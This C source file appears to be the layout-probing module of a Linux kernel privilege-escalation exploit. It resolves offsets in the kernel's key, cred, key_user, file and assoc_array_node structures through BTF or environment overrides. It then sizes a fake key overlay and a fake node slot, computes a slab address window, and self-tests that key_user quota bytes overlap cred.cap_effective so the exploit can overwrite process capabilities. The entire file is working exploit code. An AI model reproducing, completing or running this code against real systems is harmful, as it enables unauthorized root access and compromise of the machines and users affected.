#define _GNU_SOURCE
#include <errno.h>
#include <inttypes.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "btf.h"
#include "target_hardened.h"

struct k2_layout k2l;

struct member_req {
    const char *const *aliases;
    unsigned int count;
    const char *label;
    unsigned int *out;
    bool required;
};

struct env_req {
    const char *name;
    unsigned int *out;
};

static unsigned int align_up(unsigned int value, unsigned int alignment)
{
    return (value + alignment - 1) & ~(alignment - 1);
}

static void report_field(const char *name, unsigned int value)
{
    printf("K2_LAYOUT %-22s = %#x\n", name, value);
}

static int apply_members(btf_id_t type, const struct member_req *req,
                         size_t count)
{
    int rc = 0;

    for (size_t i = 0; i < count; i++) {
        unsigned int offset = 0;
        int found = -ENOENT;

        for (unsigned int a = 0; a < req[i].count && found != 0; a++)
            found = btf_member_offset(type, req[i].aliases[a], &offset);
        if (found == 0) {
            *req[i].out = offset;
            continue;
        }
        if (req[i].required && rc == 0) {
            fprintf(stderr, "K2_LAYOUT_MISSING %s\n", req[i].label);
            rc = found;
        }
    }
    return rc;
}

static const struct env_req overrides[] = {
    {"K2_OFF_KEY_USAGE", &k2l.key_usage},
    {"K2_OFF_KEY_SERIAL", &k2l.key_serial},
    {"K2_OFF_KEY_USER", &k2l.key_user},
    {"K2_OFF_KEY_EXPIRY", &k2l.key_expiry},
    {"K2_OFF_KEY_LAST_USED", &k2l.key_last_used},
    {"K2_OFF_KEY_UID", &k2l.key_uid},
    {"K2_OFF_KEY_GID", &k2l.key_gid},
    {"K2_OFF_KEY_PERM", &k2l.key_perm},
    {"K2_OFF_KEY_QUOTALEN", &k2l.key_quotalen},
    {"K2_OFF_KEY_DESC_LEN", &k2l.key_desc_len},
    {"K2_OFF_KEY_STATE", &k2l.key_state},
    {"K2_OFF_KEY_FLAGS", &k2l.key_flags},
    {"K2_OFF_KEY_HASH", &k2l.key_hash},
    {"K2_OFF_KEY_X", &k2l.key_x},
    {"K2_OFF_KEY_TYPE", &k2l.key_type},
    {"K2_OFF_KEY_DOMAIN", &k2l.key_domain},
    {"K2_OFF_KEY_DESCRIPTION", &k2l.key_description},
    {"K2_OFF_KEY_KEYS_ROOT", &k2l.key_keys_root},
    {"K2_OFF_CRED_SECUREBITS", &k2l.cred_securebits},
    {"K2_OFF_CRED_CAP_PERMITTED", &k2l.cred_cap_permitted},
    {"K2_OFF_CRED_CAP_EFFECTIVE", &k2l.cred_cap_effective},
    {"K2_OFF_KU_LOCK", &k2l.ku_lock},
    {"K2_OFF_KU_QNKEYS", &k2l.ku_qnkeys},
    {"K2_OFF_KU_QNBYTES", &k2l.ku_qnbytes},
    {"K2_OFF_FILE_CRED", &k2l.file_cred},
    {"K2_OFF_FILE_STRIDE", &k2l.file_stride},
    {"K2_OFF_FILE_SIZE", &k2l.file_size},
    {"K2_OFF_NODE_SLOTS", &k2l.node_slots},
};

static void apply_overrides(void)
{
    for (size_t i = 0; i < sizeof(overrides) / sizeof(overrides[0]); i++) {
        const char *text = getenv(overrides[i].name);
        char *end;
        unsigned long value;

        if (!text || !*text)
            continue;
        value = strtoul(text, &end, 0);
        if (*end) {
            fprintf(stderr, "K2_LAYOUT_BAD_ENV %s=%s\n", overrides[i].name,
                    text);
            continue;
        }
        *overrides[i].out = (unsigned int)value;
    }
}

/*
 * desc_len resolution order matters: struct key carries both `datalen`
 * (payload bytes) and, on newer builds, `desc_len`.  `index_key.desc_len` is
 * correct whenever it exists, and in some builds it shares a union with `x`.
 */
static int resolve_desc_len(btf_id_t key, btf_id_t index_type)
{
    uint32_t offset;

    if (btf_member_offset(key, "desc_len", &offset) == 0) {
        k2l.key_desc_len = offset;
        return 0;
    }
    if (index_type != key &&
        btf_member_offset(index_type, "desc_len", &offset) == 0) {
        k2l.key_desc_len = offset;
        return 0;
    }
    if (k2l.key_x) {
        k2l.key_desc_len = k2l.key_x;
        return 0;
    }
    if (btf_member_offset(key, "datalen", &offset) == 0) {
        k2l.key_desc_len = offset;
        printf("K2_LAYOUT note: desc_len falls back to key.datalen %#x\n",
               offset);
        return 0;
    }
    return -ENOENT;
}

int k2_layout_probe(void)
{
    static const char *const usage_a[] = {"usage"};
    static const char *const serial_a[] = {"serial"};
    static const char *const user_a[] = {"user"};
    static const char *const expiry_a[] = {"expiry"};
    static const char *const last_a[] = {"last_used_at", "last_used"};
    static const char *const uid_a[] = {"uid"};
    static const char *const gid_a[] = {"gid"};
    static const char *const perm_a[] = {"perm"};
    static const char *const quota_a[] = {"quotalen"};
    static const char *const state_a[] = {"state"};
    static const char *const flags_a[] = {"flags"};
    static const char *const hash_a[] = {"hash"};
    static const char *const x_a[] = {"x"};
    static const char *const type_a[] = {"type", "key_type"};
    static const char *const domain_a[] = {"domain_tag"};
    static const char *const desc_a[] = {"description"};
    static const char *const root_a[] = {"keys_root", "link"};
    static const char *const slots_a[] = {"slots"};
    static const char *const secure_a[] = {"securebits"};
    static const char *const permitted_a[] = {"cap_permitted"};
    static const char *const effective_a[] = {"cap_effective"};
    static const char *const qnkeys_a[] = {"qnkeys"};
    static const char *const qnbytes_a[] = {"qnbytes"};
    static const char *const lock_a[] = {"cons_lock", "lock"};
    static const char *const fcred_a[] = {"f_cred"};

    btf_id_t key, cred, key_user, file, node, payload, index_type;
    uint32_t size, width;
    int rc;

    if (k2l.key_user)
        return 0;
    if (btf_open() != 0) {
        snprintf(k2l.layout_source, sizeof(k2l.layout_source), "env");
        fprintf(stderr, "K2_LAYOUT no BTF, K2_OFF_* overrides required\n");
        apply_overrides();
        if (!k2l.key_user || !k2l.cred_cap_effective || !k2l.ku_qnbytes ||
            !k2l.node_slots) {
            fprintf(stderr, "K2_LAYOUT incomplete without BTF\n");
            return -ENODATA;
        }
        goto validate;
    }
    snprintf(k2l.layout_source, sizeof(k2l.layout_source), "btf");

    key = btf_find_struct("key");
    cred = btf_find_struct("cred");
    key_user = btf_find_struct("key_user");
    file = btf_find_struct("file");
    node = btf_find_struct("assoc_array_node");
    payload = btf_find_struct("user_key_payload");
    if (key < 0 || cred < 0 || key_user < 0 || file < 0 || node < 0) {
        fprintf(stderr, "K2_LAYOUT btf type lookup: key=%d cred=%d key_user=%d"
                " file=%d node=%d payload=%d\n", key, cred, key_user, file,
                node, payload);
        return -ENOENT;
    }

    index_type = key;
    {
        btf_id_t embedded;

        if (btf_member_type(key, "index_key", &embedded) == 0 && embedded > 0)
            index_type = embedded;
    }

    {
        const struct member_req reqs[] = {
            {usage_a, 1, "key.usage", &k2l.key_usage, true},
            {serial_a, 1, "key.serial", &k2l.key_serial, true},
            {user_a, 1, "key.user", &k2l.key_user, true},
            {expiry_a, 1, "key.expiry", &k2l.key_expiry, true},
            {last_a, 2, "key.last_used_at", &k2l.key_last_used, true},
            {uid_a, 1, "key.uid", &k2l.key_uid, true},
            {gid_a, 1, "key.gid", &k2l.key_gid, true},
            {perm_a, 1, "key.perm", &k2l.key_perm, true},
            {quota_a, 1, "key.quotalen", &k2l.key_quotalen, true},
            {state_a, 1, "key.state", &k2l.key_state, true},
            {flags_a, 1, "key.flags", &k2l.key_flags, true},
            {hash_a, 1, "key.hash", &k2l.key_hash, false},
            {x_a, 1, "key.x", &k2l.key_x, false},
            {root_a, 2, "key.keys_root", &k2l.key_keys_root, false},
        };
        const struct member_req index_reqs[] = {
            {type_a, 2, "index_key.type", &k2l.key_type, true},
            {domain_a, 1, "index_key.domain_tag", &k2l.key_domain, true},
            {desc_a, 1, "index_key.description", &k2l.key_description, true},
        };

        rc = apply_members(key, reqs, sizeof(reqs) / sizeof(reqs[0]));
        if (rc)
            return rc;
        rc = apply_members(index_type, index_reqs,
                           sizeof(index_reqs) / sizeof(index_reqs[0]));
        if (rc)
            return rc;
        rc = resolve_desc_len(key, index_type);
        if (rc) {
            fprintf(stderr, "K2_LAYOUT no desc_len field\n");
            return rc;
        }
        if (btf_struct_size(key, &size) == 0)
            k2l.key_size = size;
    }

    {
        const struct member_req reqs[] = {
            {secure_a, 1, "cred.securebits", &k2l.cred_securebits, true},
            {permitted_a, 1, "cred.cap_permitted", &k2l.cred_cap_permitted,
             true},
            {effective_a, 1, "cred.cap_effective", &k2l.cred_cap_effective,
             true},
        };

        rc = apply_members(cred, reqs, sizeof(reqs) / sizeof(reqs[0]));
        if (rc)
            return rc;
    }

    {
        const struct member_req reqs[] = {
            {qnkeys_a, 1, "key_user.qnkeys", &k2l.ku_qnkeys, true},
            {qnbytes_a, 1, "key_user.qnbytes", &k2l.ku_qnbytes, true},
            {lock_a, 2, "key_user.lock", &k2l.ku_lock, false},
        };

        rc = apply_members(key_user, reqs, sizeof(reqs) / sizeof(reqs[0]));
        if (rc)
            return rc;
        if (btf_member_size(key_user, "qnbytes", &width) != 0 || width != 4) {
            fprintf(stderr, "K2_LAYOUT key_user.qnbytes width=%u (need 4)\n",
                    width);
            return -EINVAL;
        }
    }

    {
        const struct member_req reqs[] = {
            {fcred_a, 1, "file.f_cred", &k2l.file_cred, true},
        };

        rc = apply_members(file, reqs, sizeof(reqs) / sizeof(reqs[0]));
        if (rc)
            return rc;
        if (btf_struct_size(file, &size) != 0 || size == 0)
            return -EINVAL;
        k2l.file_size = size;
        k2l.file_stride = align_up(size, 64);
    }

    {
        const struct member_req reqs[] = {
            {slots_a, 1, "assoc_array_node.slots", &k2l.node_slots, true},
        };

        rc = apply_members(node, reqs, sizeof(reqs) / sizeof(reqs[0]));
        if (rc)
            return rc;
    }

    if (payload > 0 && btf_struct_size(payload, &size) == 0 &&
        size == H_USER_PAYLOAD_HEADER)
        k2l.payload_header = size;

validate:
    apply_overrides();
    if (!k2l.payload_header)
        k2l.payload_header = H_USER_PAYLOAD_HEADER;
    if (!k2l.file_stride)
        k2l.file_stride = align_up(k2l.file_size ? k2l.file_size : 192, 64);
    if (!k2l.files_per_slab)
        k2l.files_per_slab = 4096 / k2l.file_stride;
    if (k2l.files_per_slab > H_FILES_MAX)
        k2l.files_per_slab = H_FILES_MAX;

    if (btf_enum_value("key_flag", "KEY_FLAG_IN_QUOTA", &k2l.flag_in_quota))
        k2l.flag_in_quota = 2;
    if (btf_enum_value("key_flag", "KEY_FLAG_USER_ALIVE",
                       &k2l.flag_user_alive))
        k2l.flag_user_alive = 10;

    /*
     * The fake overlay and the workers address key.usage at 0 and key.serial
     * at 4 unconditionally.
     */
    if (k2l.key_usage != 0 || k2l.key_serial != 4) {
        fprintf(stderr, "K2_LAYOUT unsupported key prefix usage=%#x serial=%#x"
                " (need 0/4)\n", k2l.key_usage, k2l.key_serial);
        return -ENOTSUP;
    }
    if (k2l.node_slots < 8 || k2l.node_slots > 128) {
        fprintf(stderr, "K2_LAYOUT node.slots=%u\n", k2l.node_slots);
        return -EINVAL;
    }
    if (k2l.files_per_slab < 4) {
        fprintf(stderr, "K2_LAYOUT filp objects_per_slab=%u\n",
                k2l.files_per_slab);
        return -EINVAL;
    }
    if (k2l.key_user >= H_DIRECT_FAKE_BYTES ||
        k2l.key_flags >= H_DIRECT_FAKE_BYTES ||
        k2l.key_description >= H_DIRECT_FAKE_BYTES ||
        k2l.key_desc_len >= H_DIRECT_FAKE_BYTES) {
        fprintf(stderr, "K2_LAYOUT key layout exceeds the fake payload\n");
        return -E2BIG;
    }

    report_field("key.usage", k2l.key_usage);
    report_field("key.serial", k2l.key_serial);
    report_field("key.user", k2l.key_user);
    report_field("key.expiry", k2l.key_expiry);
    report_field("key.last_used_at", k2l.key_last_used);
    report_field("key.uid", k2l.key_uid);
    report_field("key.perm", k2l.key_perm);
    report_field("key.quotalen", k2l.key_quotalen);
    report_field("key.desc_len", k2l.key_desc_len);
    report_field("key.state", k2l.key_state);
    report_field("key.flags", k2l.key_flags);
    report_field("key.hash", k2l.key_hash);
    report_field("key.x", k2l.key_x);
    report_field("key.type", k2l.key_type);
    report_field("key.domain_tag", k2l.key_domain);
    report_field("key.description", k2l.key_description);
    report_field("key.keys_root", k2l.key_keys_root);
    report_field("key.size", k2l.key_size);
    report_field("cred.securebits", k2l.cred_securebits);
    report_field("cred.cap_permitted", k2l.cred_cap_permitted);
    report_field("cred.cap_effective", k2l.cred_cap_effective);
    report_field("key_user.lock", k2l.ku_lock);
    report_field("key_user.qnkeys", k2l.ku_qnkeys);
    report_field("key_user.qnbytes", k2l.ku_qnbytes);
    report_field("file.size", k2l.file_size);
    report_field("file.stride", k2l.file_stride);
    report_field("file.f_cred", k2l.file_cred);
    report_field("file.objects_per_slab", k2l.files_per_slab);
    report_field("node.slots", k2l.node_slots);
    report_field("key_flag.in_quota", k2l.flag_in_quota);
    report_field("key_flag.user_alive", k2l.flag_user_alive);
    printf("K2_LAYOUT layout_source=%s\n", k2l.layout_source);
    return 0;
}

/*
 * Second half: the fake node slot, the description offset inside the fake and
 * the slab window.  Needs no privileges.
 */
int k2_layout_finish(uint64_t page_base)
{
    unsigned int desc_end, best = 0;
    bool have_slot = false;

    if (!k2l.key_user || !k2l.node_slots)
        return -EINVAL;

#define CONSIDER(field)                                                        \
    do {                                                                       \
        if (k2l.field && k2l.field + 8 > desc_end)                             \
            desc_end = k2l.field + 8;                                          \
    } while (0)
    for (unsigned int pass = 0; pass < 2; pass++) {
        desc_end = k2l.key_usage + 4;
        CONSIDER(key_serial);
        CONSIDER(key_user);
        CONSIDER(key_expiry);
        CONSIDER(key_last_used);
        CONSIDER(key_uid);
        CONSIDER(key_gid);
        CONSIDER(key_perm);
        CONSIDER(key_quotalen);
        CONSIDER(key_desc_len);
        CONSIDER(key_state);
        CONSIDER(key_flags);
        if (!pass) {
            CONSIDER(key_hash);
            CONSIDER(key_x);
        }
        CONSIDER(key_type);
        CONSIDER(key_domain);
        CONSIDER(key_description);
        if (!pass)
            CONSIDER(key_keys_root);
        k2l.desc_off = align_up(desc_end, 8);
        if (k2l.desc_off + H_PAYLOAD_DESC_MAX + 1 <= H_DIRECT_FAKE_BYTES)
            break;
        /* Second pass drops hash/x/keys_root, which the walk never reads. */
        k2l.key_hash = 0;
        k2l.key_x = 0;
        k2l.key_keys_root = 0;
    }
    if (k2l.desc_off + H_PAYLOAD_DESC_MAX + 1 > H_DIRECT_FAKE_BYTES) {
        fprintf(stderr, "K2_LAYOUT fake does not fit: %u + %u\n",
                k2l.desc_off, H_PAYLOAD_DESC_MAX + 1);
        return -E2BIG;
    }
#undef CONSIDER

    /*
     * Pick the last node slot that still ends at or before key.user, so the
     * slot value survives the field programming.  The original harness needed
     * exactly that one (slot 5 at offset 56, user at 64); the rest is layout
     * dependent.  Bits 4..7 and 8..11 both index this slot.
     */
    for (unsigned int slot = 0; slot < 16; slot++) {
        unsigned int window = k2l.node_slots + slot * 8;

        if (window + 8 > k2l.key_user)
            break;
        best = slot;
        have_slot = true;
    }
    if (!have_slot || k2l.node_slots + best * 8 + 8 > H_DIRECT_FAKE_BYTES) {
        fprintf(stderr, "K2_LAYOUT no usable node slot below key.user=%#x\n",
                k2l.key_user);
        return -EINVAL;
    }
    k2l.fake_slot = best;
    k2l.payload_node_slot = best;

    if (page_base) {
        if ((page_base & 0xfff) != 0)
            return -EINVAL;
        k2l.slab_lo = page_base > UINT64_C(0x4000000000) ?
                      page_base - UINT64_C(0x4000000000) : 0;
        k2l.slab_hi = page_base + UINT64_C(0x4000000000);
    }
    printf("K2_LAYOUT fake_slot=%u leaf_window=%#x desc_off=%u\n",
           k2l.fake_slot, k2l.node_slots + k2l.fake_slot * 8, k2l.desc_off);
    return 0;
}

void k2_layout_report(void)
{
    printf("K2_LAYOUT_REPORT type_source=%s layout_source=%s"
           " key_type_user=%#" PRIx64 " default_domain_tag=%#" PRIx64
           " fake_slot=%u desc_off=%u freeptr=%u slab=[%#" PRIx64 ",%#" PRIx64
           "]\n", k2l.type_source, k2l.layout_source, k2l.key_type_user,
           k2l.default_domain_tag, k2l.fake_slot, k2l.desc_off, k2l.freeptr,
           k2l.slab_lo, k2l.slab_hi);
}

int k2_layout_selftest(void)
{
    uint64_t cred = UINT64_C(0xffff9e8d40112280);
    uint64_t user = (cred + k2l.cred_cap_effective) - k2l.ku_qnbytes;

    if (user + k2l.ku_qnbytes != cred + k2l.cred_cap_effective) {
        fprintf(stderr, "K2_LAYOUT_SELFTEST quota_to_cap_effective\n");
        return -EINVAL;
    }
    if (k2l.ku_lock && user + k2l.ku_lock != cred + k2l.cred_securebits)
        printf("K2_LAYOUT_SELFTEST note: lock/securebits overlap drifted "
               "%#x/%#x\n", k2l.ku_lock, k2l.cred_securebits);
    if (k2l.desc_off + 2 > H_DIRECT_FAKE_BYTES ||
        k2l.node_slots + k2l.fake_slot * 8 + 8 > k2l.key_user) {
        fprintf(stderr, "K2_LAYOUT_SELFTEST fake geometry\n");
        return -EINVAL;
    }
    printf("K2_LAYOUT_SELFTEST_PASS fake_user_delta=%#x desc_off=%u "
           "fake_slot=%u\n",
           k2l.key_user + k2l.ku_qnbytes - k2l.cred_cap_effective,
           k2l.desc_off, k2l.fake_slot);
    return 0;
}
